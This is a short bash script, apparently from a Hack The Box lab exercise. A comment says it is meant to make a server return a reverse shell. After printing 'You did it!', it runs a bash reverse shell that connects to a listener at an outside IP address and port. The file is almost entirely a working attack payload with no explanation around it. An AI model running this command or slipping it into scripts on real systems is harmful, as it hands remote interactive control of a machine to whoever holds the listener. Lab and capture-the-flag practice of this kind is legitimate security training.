#!/usr/bin/env bash

# bash script that makes a request to 0.0.0.0:5000/catch_me that causes the server to respond with a reverse shell script

echo "You did it!"

# Reverse shell to your HTB IP and listener port

bash -i >& /dev/tcp/10.10.15.37/4444 0>&1

